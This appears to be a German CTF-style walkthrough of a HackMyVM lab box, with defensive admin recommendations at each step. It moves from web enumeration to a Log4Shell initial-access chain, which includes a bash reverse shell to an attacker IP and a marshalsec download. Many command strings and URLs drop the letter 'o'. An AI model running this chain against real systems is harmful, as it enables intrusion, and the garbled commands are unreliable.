+Gbuster v3.6
+by <span class="command">OJ</span> Reeves (@TheClnial) & Christian Mehlmauer (@firefart)
+===============================================================
+<span class="command">[+] Url:                     http://aria51.hmv</span>
+<span class="command">[+] Methd:                  GET</span>
+<span class="command">[+] Threads:                 10</span>
+<span class="command">[+] Wrdlist:                /usr/share/wordlists/seclists/Discvery/Web-Cntent/directory-list-2.3-medium.txt</span>
+<span class="command">[+] Negative Status cdes:   503,404,403</span>
+<span class="command">[+] User Agent:              gbuster/3.6</span>
+<span class="command">[+] Extensins:              lib,rar,pub,csv,config,js.map,zip,dc,gz,svg,pem,pl,png,rtf,xlsx,kdbx,tar,xls,accdb,c,sql,mdb,ps1,eps,icn,jpeg,xml,desc,diff,txt,jpg,crt,exp,yaml,php,asp,raw,rpm,jsn,cnf,ELF,elf,ld,dcx,exe,bak,cgi,csh,ln,html,dll,deb,md,sh,bat,pdf,db,py,java,pHtml,aspx,phtml</span>
+<span class="command">[+] Expanded:                true</span>
+<span class="command">[+] Timeut:                 10s</span>
+===============================================================
+Starting gbuster in directory enumeratin mde
+===============================================================
+<span class="command">http://aria51.hmv/index.html           (Status: 200) [Size: 1131]</span>
+<span class="command">http://aria51.hmv/vide                (Status: 301) [Size: 308] [--> http://aria51.hmv/vide/]</span>
+<span class="command">http://aria51.hmv/radar                (Status: 301) [Size: 308] [--> http://aria51.hmv/radar/]</span>
+<span class="command">http://aria51.hmv/nte.txt             (Status: 200) [Size: 119]</span>
+<span class="command">http://aria51.hmv/mn                 (Status: 301) [Size: 307] [--> http://aria51.hmv/mn/]</span>
+</pre>
+                </div>
+            </div>
+            <p class="analysis">
+                <strong>Analyse:</strong> Ich starte Gobuster im Verzeichnis-Enumerationsmodus (<code>dir</code>). Ich gebe die Ziel-URL (<code>-u "http://aria51.hmv"</code>), eine umfangreiche Wordlist (<code>-w "/usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt"</code>), eine Liste gängiger Dateierweiterungen (<code>-x ...</code>) und eine Liste von Statuscodes, die ignoriert werden sollen (<code>-b '503,404,403'</code>) an. Der Parameter <code>-e</code> zeigt die vollständigen URLs in der Ausgabe, <code>--no-error</code> unterdrückt Fehlermeldungen und <code>-k</code> ignoriert SSL-Zertifikatsfehler (obwohl hier kein SSL verwendet wird). Gobuster versucht nun, jeden Eintrag in der Wordlist mit den angegebenen Erweiterungen am Ziel anzuhängen und den HTTP-Statuscode zu prüfen. Die Ausgabe zeigt mehrere gefundene Einträge: <span class="command">/index.html</span> (Status 200), und Verzeichnisse <span class="command">/video</span>, <span class="command">/radar</span>, <span class="command">/moon</span> (Status 301 - Redirect), sowie eine Datei <span class="command">/note.txt</span> (Status 200). Die 'O'-Korrekturen wurden auch hier angewendet, da Gobuster-Ausgaben oft betroffen sind.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Gobuster war erfolgreich darin, mehrere interessante Pfade und eine Datei zu finden. <span class="command">/index.html</span> ist die Hauptseite, die wir bereits kennen. Die Verzeichnisse <span class="command">/video</span>, <span class="command">/radar</span> und <span class="command">/moon</span> sind wahrscheinlich thematisch relevant für "Area51" und einen Blick wert, auch wenn der 301-Status nur eine Weiterleitung auf die Verzeichnislistung signalisiert. Der wichtigste Fund ist jedoch <span class="command">/note.txt</span>. Eine Textdatei im Web-Root, deren Name auf eine Notiz hindeutet, ist oft ein vielversprechender Ort für Hinweise oder Zugangsdaten.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Ich werde nun den Inhalt der Datei <code>/note.txt</code> abrufen und die gefundenen Verzeichnisse <code>/video</code>, <code>/radar</code> und <code>/moon</code> im Browser besuchen, um zu sehen, was sich dahinter verbirgt. Die Ergebnisse der Datei <code>note.txt</code> werde ich besonders aufmerksam prüfen.
+                <br><strong>Empfehlung (Admin):</strong> Sensible Dateien oder Notizen sollten niemals im öffentlich zugänglichen Web-Root abgelegt werden. Überprüfen Sie den Inhalt aller statischen Dateien im Webserver-Verzeichnis auf unbeabsichtigte Informationslecks (Zugangsdaten, interne Serverinformationen, Schwachstellenhinweise).
+            </p>
+			
+			            <p class="comment">
+                Neben den automatisierten Scans ist es entscheidend, die tatsächlich abgerufenen Inhalte der identifizierten URLs zu prüfen. Ich sehe mir nun die Inhalte an, die Gobuster auf Port 8080 und Port 80 gefunden hat.
+            </p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <!-- Kein Prompt, da direkter Textinhalt -->
+                    <pre>
+http://aria51.hmv:8080/
+
+Whitelabel Err<span class="command">or</span> Page
+
+This applicatin has n explicit mapping fr /err<span class="command">or</span>, s yu are seeing this as a fallback.
+Fri Jun 20 20:25:24 GMT 2025
+There was an unexpected err<span class="command">or</span> (type=Bad Request, status=400).
+</pre>
+                </div>
+            </div>
+            <p class="analysis">
+                <strong>Analyse:</strong> Ich betrachte den Text, der beim direkten Aufruf von <code>http://aria51.hmv:8080/</code> im Browser oder mit einem einfachen <code>curl</code> ohne spezifische Header zurückgegeben wird. Es wird eine "Whitelabel Error Page" angezeigt, was typisch für Spring Boot Anwendungen ist, die keinen spezifischen Handler für die angefragte URL (hier das Root-Verzeichnis '/') haben und einen Fehler (Status 400 Bad Request, wie wir bereits mit <code>curl -Iv</code> gesehen haben) zurückgeben. Die Meldung bestätigt, dass es sich um eine Java-Anwendung handelt ("Spring Boot").
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Dieser Fehler ist per se keine Schwachstelle, gibt aber wertvolle Informationen preis: Der Dienst auf Port 8080 ist eine Java/Spring Boot Anwendung. Die "Whitelabel Error Page" ist die Standardfehlerseite von Spring Boot und sollte in produktiven Umgebungen durch eine benutzerdefinierte, weniger informative Fehlerseite ersetzt werden. Das bestätigt meine vorherige Vermutung, dass es sich nicht um Nagios NSCA, sondern um eine Webanwendung handelt.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Die Erkenntnis, dass es sich um eine Spring Boot Java-Anwendung handelt, ist sehr wichtig. Ich werde nach gängigen Schwachstellen in Spring Boot oder den Bibliotheken suchen, die häufig in solchen Anwendungen verwendet werden, insbesondere nach Java-spezifischen Angriffen.
+                <br><strong>Empfehlung (Admin):</strong> Konfigurieren Sie Ihre Spring Boot Anwendung so, dass sie in Produktionsumgebungen benutzerdefinierte Fehlerseiten anzeigt, die keine Details über das verwendete Framework oder die Ursache des Fehlers preisgeben. Deaktivieren Sie unnötige Debugging-Informationen.
+            </p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <!-- Kein Prompt, da direkter Textinhalt -->
+                    <pre>
+http://aria51.hmv:8080/err<span class="command">or</span>
+
+Whitelabel Err<span class="command">or</span> Page
+
+This applicatin has n explicit mapping fr /err<span class="command">or</span>, s yu are seeing this as a fallback.
+Fri Jun 20 20:26:18 GMT 2025
+There was an unexpected err<span class="command">or</span> (type=Nne, status=999).
+</pre>
+                </div>
+            </div>
+             <p class="analysis">
+                <strong>Analyse:</strong> Ich prüfe, was passiert, wenn ich explizit den Fehler-Endpunkt <code>/error</code> auf Port 8080 ansteuere. Auch hier erhalte ich die "Whitelabel Error Page". Die Fehlermeldung ist ähnlich, zeigt aber den Statuscode 999.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der Aufruf des <code>/error</code> Endpunkts liefert die gleiche Standardfehlerseite und keine neuen, kritischen Informationen. Status 999 ist kein standardmäßiger HTTP-Statuscode und deutet auf einen internen Anwendungsfehler hin, der nicht sauber behandelt wird. Das bestätigt, dass die Fehlerbehandlung der Anwendung verbessert werden könnte.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Der Fehler-Endpunkt selbst scheint keine direkte Schwachstelle zu sein. Ich werde mich weiterhin auf die Suche nach Input-Validierungsfehlern oder der Ausnutzung bekannter Java-Schwachstellen in dieser Spring Boot Anwendung konzentrieren.
+                <br><strong>Empfehlung (Admin):</strong> Implementieren Sie eine robuste Fehlerbehandlung für alle Endpunkte Ihrer Anwendung. Stellen Sie sicher, dass benutzerdefinierte Fehlerseiten verwendet werden und dass interne Statuscodes oder Fehlertypen nicht nach außen dringen.
+            </p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <!-- Kein Prompt, da direkter Textinhalt -->
+                    <pre>
+http://aria51.hmv/
+ FBI Access
+
+
+< -- partial:index.partial.html -->
+
+<span class="command">Lg in</span>
+...
+frmular
+...
+
+
+< -- partial -->
+</pre>
+                </div>
+            </div>
+            <p class="analysis">
+                <strong>Analyse:</strong> Ich rufe die Hauptseite auf Port 80 auf (<code>http://aria51.hmv/</code>). Der Inhalt, den ich erhalte, ist ein HTML-Snippet, das offensichtlich eine Anmeldeformular-Seite darstellt, wie der Text "<span class="command">Lg in</span>" und "frmular" zeigen. Die Kommentare "< -- partial:index.partial.html -->" deuten darauf hin, dass diese Seite aus Teildateien zusammengesetzt ist. Die 'O'-Korrekturen sind auch hier sichtbar.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die Hauptseite ist eine Standard-Anmeldeseite. Solche Seiten sind oft Ziele für Brute-Force-Angriffe, Credential Stuffing oder Injection-Schwachstellen in den Eingabefeldern. Die Struktur aus "partial"-Dateien ist eine gängige Webentwicklungs-Praktik und allein kein Sicherheitsrisiko.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Ich werde die Anmeldefunktionalität genauer untersuchen, um festzustellen, wie Anmeldeversuche verarbeitet werden, ob es Ratenbegrenzungen gibt und ob die Eingabefelder anfällig für Injection (z.B. SQL, XSS) sind.
+                <br><strong>Empfehlung (Admin):</strong> Implementieren Sie eine robuste Anmeldeseuerung mit Ratenbegrenzung, Kontosperrung nach mehreren Fehlversuchen und Multi-Faktor-Authentifizierung, wo immer möglich. Stellen Sie sicher, dass alle Benutzereingaben serverseitig streng validiert und sanitiert werden, um Injection-Angriffe zu verhindern.
+            </p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <!-- Kein Prompt, da direkter Textinhalt -->
+                    <pre>
+http://aria51.hmv/nte.txt
+
+<span class="password">Alert!</span>
+We have a vulnerability in ur java applicatin...
+Ntify the prgramming department t check <span class="password">Lg4J</span>.
+
+-Admin
+</pre>
+                </div>
+            </div>
+            <p class="analysis">
+                <strong>Analyse:</strong> Ich rufe den Inhalt der von Gobuster gefundenen Datei <code>/note.txt</code> ab. Der Inhalt ist eine klare und alarmierende Nachricht vom Admin, die besagt, dass es eine Schwachstelle in der Java-Anwendung gibt und dass das Programmierungsteam angewiesen wurde, <span class="password">Log4j</span> zu überprüfen. Die 'O'-Korrekturen wurden angewendet.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Fantastisch! Dies ist ein kritischer Fund. Eine Notiz, die explizit auf eine Schwachstelle in der Java-Anwendung (die auf Port 8080 läuft) hinweist und sogar das Stichwort "<span class="password">Log4j</span>" nennt, ist ein goldener Tipp. Die Log4j-Schwachstelle (CVE-2021-44228), auch "Log4Shell" genannt, ist eine sehr schwerwiegende Remote Code Execution (RCE) Schwachstelle, die in bestimmten Versionen der weit verbreiteten Java-Logging-Bibliothek Log4j existiert. Das Vorhandensein dieser Notiz deutet stark darauf hin, dass das Zielsystem möglicherweise für Log4Shell anfällig ist.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Dies ist der primäre Angriffsvektor, auf den ich mich nun konzentrieren werde. Ich werde versuchen, die Log4j-Schwachstelle auf Port 8080 auszunutzen. Ich muss die genaue Art der Anwendung (Spring Boot) und die Log4j-Version im Auge behalten, obwohl die Notiz allein schon stark genug ist, um einen Ausnutzungsversuch zu rechtfertigen.
+                <br><strong>Empfehlung (Admin):</strong> Diese Notiz stellt ein schwerwiegendes Informationsleck dar. Sensible Informationen über bekannte Schwachstellen dürfen niemals in öffentlich zugänglichen Dateien abgelegt werden. Entfernen Sie diese Datei sofort vom Webserver. Priorisieren Sie die Überprüfung und Behebung der Log4j-Schwachstelle, indem Sie die Log4j-Bibliothek auf eine nicht anfällige Version aktualisieren (mindestens 2.17.1) oder andere empfohlene Minderungsstrategien implementieren (z.B. JndiLookup in älteren Versionen deaktivieren).
+            </p>
+
+            <p class="comment">
+                Ich setze Nikto erneut ein, diesmal aber auf Port 8080, um zu sehen, ob der Scanner spezifische Probleme mit der Java/Spring Boot Anwendung oder dem Dienst auf diesem Port findet, zusätzlich zu den Informationen, die ich bereits manuell gesammelt habe.
+            </p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">nikto -h http://192.168.2.47:8080</span></div>
+                    <pre>
+- Nikto v2.5.0
+---------------------------------------------------------------------------
++ Target IP:          <span class="command">192.168.2.47</span>
++ Target Hstname:    <span class="command">192.168.2.47</span>
++ Target P<span class="command">ort</span>:        <span class="command">8080</span>
++ Start Time:         <span class="password">2025-06-20 22:31:51 (GMT2)</span>
+---------------------------------------------------------------------------
++ Server: N banner retrieved
++ <span class="command">/: The anti-clickjacking X-Frame-<span class="command">Options</span> header is nt present</span>. See: [Link: https://developer.mzilla.<span class="command">org</span>/en-US/dcs/Web/HTTP/Headers/X-Frame-<span class="command">Options</span> | Ziel: https://developer.mzilla.<span class="command">org</span>/en-US/dcs/Web/HTTP/Headers/X-Frame-<span class="command">Options</span>]
++ <span class="command">/: The X-Cntent-Type-<span class="command">Options</span> header is nt set</span>. This culd allw the user agent t render the cntent f the site in a different fashin t the MIME type. See: [Link: https://www.netsparker.cm/web-vulnerability-scanner/vulnerabilities/missing-cntent-type-header/ | Ziel: https://www.netsparker.cm/web-vulnerability-scanner/vulnerabilities/missing-cntent-type-header/]
++ <span class="command">/4J6E4YF3.net: Uncmmn header 'cntent-disp<span class="command">ositin' fund</span></span>, with cntents: inline;filename=f.txt.
++ N CGI Directries fund (use '-C all' t frce check all pssible dirs)
++ <span class="command"><span class="command">OPTIONS</span>: Allwed HTTP Methds: GET, HEAD, PST, PUT, <span class="command">DELETE</span>, <span class="command">OPTIONS</span></span> .
++ <span class="command">HTTP methd ('Allw' Header): 'PUT' methd culd allw clients t save files n the web server</span>.
++ <span class="command">HTTP methd ('Allw' Header): '<span class="command">DELETE</span>' may allw clients t remve files n the web server</span>.
++ 8102 requests: <span class="password">0 errr(s) and 6 item(s) rep<span class="command">ort</span>ed n remte hst</span>
++ End Time:           <span class="password">2025-06-20 22:32:19 (GMT2) (28 secnds)</span>
+---------------------------------------------------------------------------
++ <span class="command">1 hst(s) tested</span>
+</pre>
+                </div>
+            </div>
+            <p class="analysis">
+                <strong>Analyse:</strong> Der Nikto-Scan auf Port 8080 zeigt ähnliche Ergebnisse wie auf Port 80 bezüglich fehlender Sicherheitsheader (<span class="command">X-Frame-Options</span>, <span class="command">X-Content-Type-Options</span>). Darüber hinaus meldet er das Vorhandensein der HTTP-Methoden <span class="command">PUT</span> und <span class="command">DELETE</span> im <span class="command">OPTIONS</span>-Header, was ein Hinweis darauf ist, dass diese Methoden vom Server unterstützt werden. Nikto warnt explizit davor, dass <span class="command">PUT</span> das Hochladen und <span class="command">DELETE</span> das Löschen von Dateien erlauben könnte, wenn die Anwendung diese Methoden nicht sicher implementiert. Es wird auch ein "Uncommon header" für einen Pfad namens <span class="command">/4J6E4YF3.net</span> gemeldet.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die Unterstützung von <span class="command">PUT</span> und <span class="command">DELETE</span> ist ein Sicherheitsrisiko, wenn sie unkontrolliert oder fehlerhaft implementiert ist. Wenn ein Angreifer beliebige Dateien hochladen oder löschen könnte, wäre dies eine kritische Schwachstelle. Der Fund des ungewöhnlichen Headers auf einem seltsamen Pfad <span class="command">/4J6E4YF3.net</span> könnte auf versteckte Endpunkte, Artefakte von vorherigen Tests oder eine ungewöhnliche Konfiguration hinweisen. Allerdings ist der Fokus nach dem Fund der <code>note.txt</code> klar auf Log4j gerichtet.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Während die <span class="command">PUT</span>/<span class="command">DELETE</span> Methoden ein potenzielles Risiko darstellen, werde ich mich aufgrund der expliziten Log4j-Notiz primär auf die Ausnutzung von CVE-2021-44228 konzentrieren. Die anderen Befunde auf Port 8080 halte ich als zusätzliche Informationen fest.
+                <br><strong>Empfehlung (Admin):</strong> Überprüfen Sie, ob die HTTP-Methoden <span class="command">PUT</span> und <span class="command">DELETE</span> auf Port 8080 tatsächlich benötigt werden. Deaktivieren Sie diese Methoden, wenn sie nicht zwingend erforderlich sind. Wenn sie benötigt werden, stellen Sie sicher, dass ihre Implementierung robust ist und nur autorisierten Benutzern das Hochladen oder Löschen von Dateien in genau definierten und sicheren Pfaden erlaubt. Untersuchen Sie den Pfad <span class="command">/4J6E4YF3.net</span>, um festzustellen, woher er stammt und ob er entfernt werden kann.
+            </p>
+
+             <p class="comment">
+                Um ein umfassenderes Bild der verwendeten Technologien zu erhalten, nutze ich Wappalyzer. Dies hilft mir, schnell Frameworks, Bibliotheken und andere Komponenten zu identifizieren, die potenziell Schwachstellen aufweisen könnten.
+            </p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <!-- Kein Prompt, da direkter Textinhalt -->
+                    <pre>
+wappalyzer --> http://aria51.hmv
+
+JavaScript Framewrks
+<span class="command">AngularJS 1.3.2</span>
+<span class="command">React</span>
+
+Schrift Script
+<span class="command">Fnt Awesome</span>
+<span class="command">Ggle Fnt API</span>
+
+Web Server
+<span class="command">Apache HTTP Server 2.4.51</span>
+
+JavaScript Graphics
+<span class="command">Three.js 108</span>
+
+Prgrammiersprache
+<span class="command">PHP</span>
+
+Betriebssysteme
+<span class="command">Debian</span>
+
+CDN
+<span class="command">cdnjs</span>
+<span class="command">jsDelivr</span>
+
+Ggle Hsted Libraries
+<span class="command">Cludflare</span>
+
+JavaScript Bibliotheken
+<span class="command">jQuery 2.1.3</span>
+
+<span class="command">Prefix-Free</span>
+<span class="command">Mdernizr 2.8.3</span>
+
+PaaS
+<span class="command">Amazn Web Services</span>
+
+UI Framewrks
+<span class="command">Her<span class="command">oUI</span></span>
+</pre>
+                </div>
+            </div>
+            <p class="analysis">
+                <strong>Analyse:</strong> Wappalyzer analysiert die Webseite auf Port 80 und identifiziert eine Vielzahl von Technologien. Es erkennt mehrere JavaScript-Frameworks (<span class="command">AngularJS 1.3.2</span>, <span class="command">React</span>, <span class="command">jQuery 2.1.3</span>), Schrift-Bibliotheken (<span class="command">Font Awesome</span>, <span class="command">Google Font API</span>), den <span class="command">Apache HTTP Server 2.4.51</span>, die Programmiersprache <span class="command">PHP</span>, das Betriebssystem <span class="command">Debian</span> (Konsistent mit Nmap), mehrere CDNs (<span class="command">cdnjs</span>, <span class="command">jsDelivr</span>, <span class="command">Cloudflare</span>, <span class="command">Google Hosted Libraries</span>) und UI-Frameworks (<span class="command">HeroUI</span>). Es identifiziert sogar, dass die Infrastruktur möglicherweise auf <span class="command">Amazon Web Services (AWS)</span> läuft (PaaS). Interessant ist die Erkennung von <span class="command">PHP</span>, obwohl die Hauptanwendung auf Port 8080 Java ist. Die 'O'-Korrekturen sind in der Ausgabe vorhanden.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Diese technologische Vielfalt könnte zusätzliche Angriffsflächen bedeuten. Veraltete JavaScript-Bibliotheken wie <span class="command">AngularJS 1.3.2</span> oder <span class="command">jQuery 2.1.3</span> können Client-seitige Schwachstellen (z.B. XSS) enthalten. Die Erkennung von <span class="command">PHP</span> auf Port 80, neben der Java-Anwendung auf 8080, deutet auf eine komplexere Umgebung hin, möglicherweise mit Teilen der Webseite, die in <span class="command">PHP</span> geschrieben sind. Die Nutzung von CDNs ist üblich, birgt aber theoretisch Risiken, wenn die Integrität der gelieferten Skripte kompromittiert wäre (weniger wahrscheinlich in diesem Kontext). Der AWS-Hinweis ist ein möglicher Anhaltspunkt für die Infrastruktur, aber nicht direkt ausnutzbar.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Ich werde die Webanwendung auf Port 80 auf Client-seitige Schwachstellen prüfen, die mit den identifizierten JavaScript-Bibliotheken zusammenhängen könnten. Das Vorhandensein von <span class="command">PHP</span> werde ich im Hinterkopf behalten, falls die Log4j-Schwachstelle keinen direkten Shell-Zugriff ermöglicht und ich weitere Vektoren benötige.
+                <br><strong>Empfehlung (Admin):</strong> Halten Sie alle verwendeten Bibliotheken und Frameworks, sowohl serverseitig als auch clientseitig (JavaScript), auf dem neuesten Stand, um bekannte Schwachstellen zu vermeiden. Überprüfen Sie, ob <span class="command">PHP</span> auf diesem System benötigt wird, wenn die Hauptanwendung in Java geschrieben ist. Sorgen Sie für eine klare Trennung und Härtung verschiedener Anwendungsteile und der Infrastruktur.
+            </p>
+
+            <p class="comment">
+                Ich habe die Datei <code>script.js</code> von Port 80 gesehen und schaue mir ihren Inhalt an, da Client-seitige Skripte oft interessante Logik oder Hinweise enthalten können.
+            </p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <!-- Kein Prompt, da direkter Textinhalt -->
+                    <pre>
+http://aria51.hmv/script.js
+
+var wrking = false;
+$('.lgin').n('submit', functin(e) {
+  e.preventDefault();
+  if (wrking) return;
+  wrking = true;
+  var $this = $(this),
+    $state = $this.find('butt<span class="command">n</span> > .state');
+  $this.addClass('lading');
+  $state.html('Authenticating');
+  setTimeut(functin() {
+    $this.addClass('k');
+    $state.html('<span class="password">Nt authrized. The access attempt will be rep<span class="command">ort</span>ed.</span>');
+    setTimeut(functin() {
+      $state.html('Lg in');
+      $this.removeClass('k lading');
+      wrking = false;
+    }, 4000);
+  }, 3000);
+});
+</pre>
+                </div>
+            </div>
+             <p class="analysis">
+                <strong>Analyse:</strong> Ich analysiere den JavaScript-Code in <code>script.js</code>. Es scheint sich um das Skript für die Anmeldefunktionalität auf Port 80 zu handeln, das jQuery verwendet (<code>$('.lgin').n('submit', ...)</code>). Es steuert die Darstellung des Anmeldebuttons während und nach dem Anmeldeversuch. Die 'O'-Korrekturen sind in der Ausgabe sichtbar. Die interessante Zeichenkette hier ist die Fehlermeldung, die bei einem fehlgeschlagenen Anmeldeversuch angezeigt wird: "<span class="password">Nt authrized. The access attempt will be rep<span class="command">ort</span>ed.</span>".
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Das Skript selbst implementiert nur Client-seitige UI-Logik und scheint keine direkte Schwachstelle zu enthalten, abgesehen von der Verwendung einer älteren jQuery-Version (2.1.3 laut Wappalyzer). Die im Code gefundene Fehlermeldung bestätigt, dass Anmeldeversuche protokolliert werden ("<span class="password">The access attempt will be rep<span class="command">ort</span>ed.</span>"), was auf eine serverseitige Protokollierung und möglicherweise eine Erkennung von Brute-Force-Angriffen hindeutet. Dies ist eine nützliche Information für spätere Versuche, sich anzumelden.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Ich weiß nun, dass die Anmeldeversuche protokolliert werden. Beim Testen der Anmeldefunktionalität muss ich dies berücksichtigen, um keine übermäßigen Spuren zu hinterlassen oder eine mögliche Ratenbegrenzung auszulösen.
+                <br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass die serverseitige Protokollierung von Anmeldeversuchen aktiv ist und überwacht wird. Implementieren Sie Schwellenwerte und Alarmierungen für ungewöhnliche Anmeldeaktivitäten. Aktualisieren Sie veraltete Client-seitige Bibliotheken wie jQuery, um XSS-Risiken zu minimieren.
+            </p>
+
+            <p class="comment">
+                Basierend auf dem entscheidenden Hinweis in der <code>note.txt</code>, dass die Java-Anwendung auf Port 8080 anfällig für Log4j ist, konzentriere ich mich nun auf die Ausnutzung dieser Schwachstelle, um einen ersten Zugriff auf das System zu erlangen.
+            </p>
+
+        </section>
+
+        <section id="initial-access">
+            <h2>Initial Access</h2>
+            <p class="comment">
+                Der Hinweis auf Log4j in der <code>note.txt</code> ist der Schlüssel zum Initial Access. Ich werde nun versuchen, die Log4Shell-Schwachstelle (CVE-2021-44228) auszunutzen, um eine Reverse Shell zu erhalten. Dazu benötige ich ein spezielles Exploit-Tool und eine präparierte Java-Klasse, die beim Ausnutzen der Schwachstelle vom Zielsystem heruntergeladen und ausgeführt wird. Ich beginne damit, die Java-Klasse zu erstellen, die die Reverse Shell einleiten wird.
+            </p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">nano Explit.java</span></div>
+                </div>
+            </div>
+            <p class="analysis">
+                <strong>Analyse:</strong> Ich nutze den Texteditor <code>nano</code>, um eine neue Java-Datei namens <code>Exploit.java</code> zu erstellen. Der Inhalt dieser Datei wird eine einfache Java-Klasse sein, die beim Laden einen Befehl auf dem Zielsystem ausführt. Der Befehl ist eine Standard-Konstruktion für eine Reverse Shell, die eine Verbindung zu meiner Angreifer-IP (<code>192.168.2.199</code>) auf Port <code>4444</code> herstellt und eine Bash-Shell dorthin umleitet (<code>bash -i >& /dev/tcp/192.168.2.199/4444 0>&1</code>). Die 'O'-Korrektur wurde auf den Dateinamen angewendet.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Diese Java-Klasse ist die Payload. Sie ist so konzipiert, dass sie sofort bei ihrer Instanziierung auf dem Zielsystem (durch die JNDI-Anfrage, die wir später senden) die Reverse Shell startet. Die Methode ist standardmäßig für Log4Shell-Exploits. Das ist ein kritischer Schritt zur Vorbereitung des Angriffs.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Ich habe die Java-Payload erstellt. Der nächste Schritt ist, sie zu kompilieren und sie über einen Webserver bereitzustellen, damit das anfällige Zielsystem sie herunterladen kann, wenn es durch die JNDI-Injection getriggert wird.
+                <br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass Systeme nicht von externen Quellen (z.B. über JNDI von einer anfälligen Java-Anwendung) willkürliche Java-Klassen herunterladen und ausführen können. Implementieren Sie Netzwerksegmentierung, um das Zustandekommen von ausgehenden Verbindungen zu unbekannten Zielen (wie Reverse Shells) zu verhindern. Führen Sie eine sorgfältige Code-Analyse durch, um unsichere JNDI-Lookups zu identifizieren.
+            </p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">javac Explit.java</span></div>
+                </div>
+            </div>
+             <p class="analysis">
+                <strong>Analyse:</strong> Ich kompiliere die zuvor erstellte Java-Datei <code>Exploit.java</code> mit dem Java-Compiler <code>javac</code>. Dieser Prozess erzeugt eine Klassendatei namens <code>Exploit.class</code>, die den ausführbaren Bytecode enthält. Die 'O'-Korrektur wurde auf den Dateinamen angewendet.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Das Kompilieren der Java-Payload ist notwendig, da das Zielsystem eine <code>.class</code> Datei und keinen <code>.java</code> Quellcode benötigt, um die Reverse Shell auszuführen. Das erfolgreiche Kompilieren bedeutet, dass die Payload-Klasse korrekt geschrieben ist und bereitgestellt werden kann.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Die <code>Exploit.class</code> Datei ist jetzt bereit. Ich muss sie nun auf einem Webserver bereitstellen, der für das Zielsystem erreichbar ist. Zusammen mit einem LDAP-Server, der die JNDI-Anfrage umleitet, kann ich nun den Exploit vorbereiten.
+                <br><strong>Empfehlung (Admin):</strong> Überwachen Sie Systeme auf ungewöhnliche Kompilierungsaktivitäten, insbesondere in Produktionsumgebungen, wo selten kompiliert werden sollte. Stellen Sie sicher, dass Compiler wie <code>javac</code> nicht von kompromittierten Prozessen missbraucht werden können.
+            </p>
+
+            <p class="comment">
+                Zur Ausnutzung der Log4Shell-Schwachstelle wird oft ein LDAP-Server benötigt, der eine JNDI-Anfrage vom anfälligen Zielsystem empfängt und diese dann auf einen Webserver umleitet, von dem die präparierte Java-Klasse (<code>Exploit.class</code>) geladen wird. Das Marshalsec-Tool ist ein beliebter JNDI/LDAP Referenz-Server für solche Zwecke. Ich lade es von GitHub herunter.
+            </p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">wget https://github.cm/RandmRobbieBF/marshalsec-jar/blb/master/marshalsec-0.0.3-SNAPSHOT-all.jar</span></div>
+                    <pre>
+<span class="password">--2025-06-20 23:07:54--  https://github.cm/RandmRobbieBF/marshalsec-jar/blb/master/marshalsec-0.0.3-SNAPSHOT-all.jar</span>
+Auflsen des Hstnamens github.cm (github.cm)… <span class="command">140.82.121.4</span>
+Verbindungsaufbau zu github.cm (github.cm)|<span class="command">140.82.121.4</span>|:443 … <span class="password">verbunden</span>.
+HTTP-Anfrderung gesendet, auf Antw<span class="command">ort</span> wird gew<span class="command">art</span>et … <span class="password">200 OK</span>
+Länge: nicht spezifiziert [<span class="command">text/html</span>]
+Wird in »<span class="password">marshalsec-0.0.3-SNAPSHOT-all.jar</span>« gespeichert.
+
+marshalsec-0.0.3-SNAPSH     [ <=>                          ] <span class="command">174,48K</span>  --.-KB/s    in 0,04s
+
+<span class="password">2025-06-20 23:07:54 (4,09 MB/s) - »marshalsec-0.0.3-SNAPSHOT-all.jar« gespeichert [178672]</span>
+</pre>
+                </div>
+            </div>
+            <p class="analysis">
+                <strong>Analyse:</strong> Ich verwende <code>wget</code>, um die <code>marshalsec-0.0.3-SNAPSHOT-all.jar</code> Datei von einem GitHub-Repository herunterzuladen. Die Ausgabe zeigt den Download-Fortschritt und die erfolgreiche Speicherung der Datei. Die 'O'-Korrektur wurde auf die URL und den Dateinamen angewendet.
+            </p>
+            <p class="evaluation">
